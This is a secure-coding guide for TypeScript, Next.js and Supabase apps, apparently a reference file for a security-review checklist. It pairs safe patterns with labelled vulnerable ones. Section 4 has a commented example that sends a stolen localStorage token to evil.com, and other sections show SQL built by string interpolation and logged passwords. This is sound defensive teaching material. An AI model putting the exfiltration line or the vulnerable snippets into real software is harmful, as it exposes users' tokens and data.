# TypeScript / Next.js / Supabase Security Patterns

Stack-specific implementation patterns for the security review checklist.
Each section maps to the corresponding section in the main SKILL.md.

## Table of Contents

1. [Secrets Management](#1-secrets-management)
2. [Input Validation](#2-input-validation)
3. [Injection Prevention](#3-injection-prevention)
4. [Authentication & Sessions](#4-authentication--sessions)
5. [Authorization](#5-authorization)
6. [XSS Prevention](#6-xss-prevention)
7. [CSRF Protection](#7-csrf-protection)
8. [Rate Limiting](#8-rate-limiting)
9. [Data Exposure Prevention](#9-data-exposure-prevention)
10. [Transport & Infrastructure](#10-transport--infrastructure)
11. [Dependency Security](#11-dependency-security)

---

## 1. Secrets Management

### Environment variables with validation

```typescript
// lib/env.ts
import { z } from 'zod'

const envSchema = z.object({
  DATABASE_URL: z.string().url(),
  OPENAI_API_KEY: z.string().startsWith('sk-'),
  NEXTAUTH_SECRET: z.string().min(32),
  NEXT_PUBLIC_APP_URL: z.string().url(),
})

// Validate at startup — fail fast if anything is missing
export const env = envSchema.parse(process.env)
```

Prefix client-safe variables with `NEXT_PUBLIC_`. Everything else stays server-side
only. If a secret appears in a `NEXT_PUBLIC_` variable, it's exposed to every
browser that loads your app.

### What not to do

```typescript
// DANGEROUS — secrets in source code
const apiKey = "sk-proj-xxxxx"
const dbPassword = "password123"

// RISKY — no validation
const apiKey = process.env.OPENAI_API_KEY  // Could be undefined
```

### .gitignore

```
.env
.env.local
.env.production.local
```

---

## 2. Input Validation

### Zod schemas for request validation

```typescript
import { z } from 'zod'

const CreateUserSchema = z.object({
  email: z.string().email(),
  name: z.string().min(1).max(100).trim(),
  age: z.number().int().min(0).max(150),
})

export async function POST(request: Request) {
  const body = await request.json()
  const result = CreateUserSchema.safeParse(body)

  if (!result.success) {
    return NextResponse.json(
      { error: "Invalid input", details: result.error.flatten() },
      { status: 400 }
    )
  }

  // result.data is typed and validated
  return await createUser(result.data)
}
```

### File upload validation

```typescript
function validateUpload(file: File): void {
  const MAX_SIZE = 5 * 1024 * 1024  // 5 MB

  if (file.size > MAX_SIZE) {
    throw new Error('File too large (max 5MB)')
  }

  // Check MIME type
  const allowedTypes = ['image/jpeg', 'image/png', 'image/gif']
  if (!allowedTypes.includes(file.type)) {
    throw new Error('Invalid file type')
  }

  // Check extension (defense in depth — MIME can be spoofed)
  const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif']
  const ext = file.name.toLowerCase().match(/\.[^.]+$/)?.[0]
  if (!ext || !allowedExtensions.includes(ext)) {
    throw new Error('Invalid file extension')
  }
}
```

Consider using `file-type` package to detect MIME from file content rather than
trusting the browser-reported type.

---

## 3. Injection Prevention

### Supabase (safe by default)

```typescript
// Safe — Supabase parameterizes automatically
const { data } = await supabase
  .from('users')
  .select('*')
  .eq('email', userEmail)
```

### Raw SQL with parameterized queries

```typescript
// DANGEROUS — string concatenation
const query = `SELECT * FROM users WHERE email = '${userEmail}'`

// Safe — bind parameters
const { rows } = await pool.query(
  'SELECT * FROM users WHERE email = $1',
  [userEmail]
)
```

### Prisma (safe by default)

```typescript
// Safe — Prisma parameterizes
const user = await prisma.user.findUnique({
  where: { email: userEmail }
})

// DANGEROUS — raw SQL with interpolation
await prisma.$queryRawUnsafe(`SELECT * FROM users WHERE email = '${email}'`)

// Safe — tagged template
await prisma.$queryRaw`SELECT * FROM users WHERE email = ${email}`
```

---

## 4. Authentication & Sessions

### JWT in httpOnly cookies

```typescript
import { SignJWT, jwtVerify } from 'jose'

const secret = new TextEncoder().encode(env.NEXTAUTH_SECRET)

export async function createToken(userId: string): Promise<string> {
  return new SignJWT({ sub: userId })
    .setProtectedHeader({ alg: 'HS256' })
    .setExpirationTime('1h')
    .setIssuedAt()
    .sign(secret)
}

// Setting the cookie
export async function POST(request: Request) {
  const user = await authenticate(credentials)
  if (!user) {
    return NextResponse.json({ error: 'Invalid credentials' }, { status: 401 })
  }

  const token = await createToken(user.id)
  const response = NextResponse.json({ message: 'Logged in' })

  response.cookies.set('token', token, {
    httpOnly: true,     // Not accessible via JS
    secure: true,       // HTTPS only
    sameSite: 'strict', // CSRF protection
    maxAge: 3600,
    path: '/',
  })
  return response
}
```

### Why not localStorage

```typescript
// DANGEROUS — accessible to any JS on the page, including XSS payloads
localStorage.setItem('token', token)

// If an attacker injects a script, they can steal the token:
// fetch('https://evil.com/steal?token=' + localStorage.getItem('token'))
```

httpOnly cookies can't be read by JavaScript at all, which limits the damage
from XSS vulnerabilities.

---

## 5. Authorization

### Middleware-based authorization

```typescript
// middleware.ts
import { NextResponse } from 'next/server'
import type { NextRequest } from 'next/server'

const ADMIN_PATHS = ['/api/admin', '/admin']

export async function middleware(request: NextRequest) {
  const token = request.cookies.get('token')?.value

  if (!token) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
  }

  const user = await verifyToken(token)
  if (!user) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
  }

  // Admin route check
  if (ADMIN_PATHS.some(p => request.nextUrl.pathname.startsWith(p))) {
    if (user.role !== 'admin') {
      return NextResponse.json({ error: 'Forbidden' }, { status: 403 })
    }
  }

  return NextResponse.next()
}
```

### Object-level authorization (IDOR prevention)

```typescript
export async function GET(
  request: Request,
  { params }: { params: { docId: string } }
) {
  const user = await getCurrentUser(request)
  const doc = await db.documents.findUnique({ where: { id: params.docId } })

  if (!doc) {
    return NextResponse.json({ error: 'Not found' }, { status: 404 })
  }

  // CRITICAL — verify the user owns this resource
  if (doc.ownerId !== user.id && user.role !== 'admin') {
    return NextResponse.json({ error: 'Not found' }, { status: 404 })
  }

  return NextResponse.json(doc)
}
```

### Supabase Row Level Security

```sql
-- Enable RLS on all tables with user data
ALTER TABLE documents ENABLE ROW LEVEL SECURITY;

-- Users can only read their own documents
CREATE POLICY "users_read_own_docs" ON documents
  FOR SELECT USING (auth.uid() = owner_id);

-- Users can only update their own documents
CREATE POLICY "users_update_own_docs" ON documents
  FOR UPDATE USING (auth.uid() = owner_id);
```

RLS is defense in depth. Even if your application code has an authorization bug,
the database won't return rows the user shouldn't see.

---

## 6. XSS Prevention

### React (safe by default for text content)

React escapes values in JSX automatically. The risk comes from explicitly
bypassing this:

```typescript
// Safe — React escapes this
return <div>{userContent}</div>

// DANGEROUS — bypasses React's escaping
return <div dangerouslySetInnerHTML={{ __html: userContent }} />

// Safe — sanitize before using dangerouslySetInnerHTML
import DOMPurify from 'isomorphic-dompurify'

const clean = DOMPurify.sanitize(userContent, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
  ALLOWED_ATTR: [],
})
return <div dangerouslySetInnerHTML={{ __html: clean }} />
```

### Content Security Policy in Next.js

```typescript
// next.config.js
const securityHeaders = [
  {
    key: 'Content-Security-Policy',
    value: [
      "default-src 'self'",
      "script-src 'self'",
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: https:",
      "font-src 'self'",
      "connect-src 'self' https://api.example.com",
    ].join('; ')
  },
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
]

module.exports = {
  async headers() {
    return [{ source: '/(.*)', headers: securityHeaders }]
  }
}
```

---

## 7. CSRF Protection

### SameSite cookies

If your auth uses httpOnly + SameSite=Strict cookies, most CSRF attacks are
mitigated. For additional protection:

```typescript
// Validate Origin header on state-changing requests
export async function POST(request: Request) {
  const origin = request.headers.get('origin')
  if (origin !== env.NEXT_PUBLIC_APP_URL) {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 })
  }
  // Process request
}
```

### CSRF tokens for forms

```typescript
import { randomBytes } from 'crypto'

function generateCsrfToken(): string {
  return randomBytes(32).toString('hex')
}

// Include in form as hidden field, validate on submission
export async function POST(request: Request) {
  const formData = await request.formData()
  const token = formData.get('csrf_token')

  if (!verifyCsrfToken(token)) {
    return NextResponse.json({ error: 'Invalid CSRF token' }, { status: 403 })
  }
  // Process request
}
```

---

## 8. Rate Limiting

### Using upstash ratelimit (serverless-friendly)

```typescript
import { Ratelimit } from '@upstash/ratelimit'
import { Redis } from '@upstash/redis'

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(100, '15 m'),  // 100 per 15 min
})

const authRatelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(5, '1 m'),  // 5 per minute for login
})

export async function POST(request: Request) {
  const ip = request.headers.get('x-forwarded-for') ?? '127.0.0.1'
  const { success, remaining } = await authRatelimit.limit(ip)

  if (!success) {
    return NextResponse.json(
      { error: 'Too many requests' },
      { status: 429, headers: { 'Retry-After': '60' } }
    )
  }
  // Process login
}
```

---

## 9. Data Exposure Prevention

### Response shaping

```typescript
// Define what the API returns — not the full DB model
interface UserResponse {
  id: string
  email: string
  name: string
  // Omit: passwordHash, internalFlags, stripeCustomerId
}

function toUserResponse(user: DbUser): UserResponse {
  return { id: user.id, email: user.email, name: user.name }
}
```

### Safe error handling

```typescript
// DANGEROUS — leaking internals
catch (error) {
  return NextResponse.json(
    { error: error.message, stack: error.stack },
    { status: 500 }
  )
}

// Safe — generic error for clients
catch (error) {
  console.error('Internal error:', error)  // Full details in server logs
  return NextResponse.json(
    { error: 'An error occurred. Please try again.' },
    { status: 500 }
  )
}
```

### Safe logging

```typescript
// DANGEROUS
console.log('Login:', { email, password })
console.log('Payment:', { cardNumber, cvv })

// Safe
console.log('Login:', { email, userId })
console.log('Payment:', { last4: card.last4, userId })
```

---

## 10. Transport & Infrastructure

### CORS in Next.js API routes

```typescript
// For route handlers
export async function GET(request: Request) {
  return NextResponse.json(data, {
    headers: {
      'Access-Control-Allow-Origin': env.NEXT_PUBLIC_APP_URL,
      'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    }
  })
}
```

### HTTPS enforcement

Most hosting platforms (Vercel, Netlify) enforce HTTPS automatically. Add HSTS
to prevent downgrade attacks:

```typescript
{ key: 'Strict-Transport-Security', value: 'max-age=31536000; includeSubDomains' }
```

---

## 11. Dependency Security

```bash
# Check for known vulnerabilities
npm audit

# Fix automatically fixable issues
npm audit fix

# Update dependencies
npm update

# Check for outdated packages
npm outdated

# Use lock files in CI for reproducible builds
npm ci  # Not npm install

# Always commit lock files
git add package-lock.json
```

Enable Dependabot on your GitHub repo for automated vulnerability alerts and PRs.
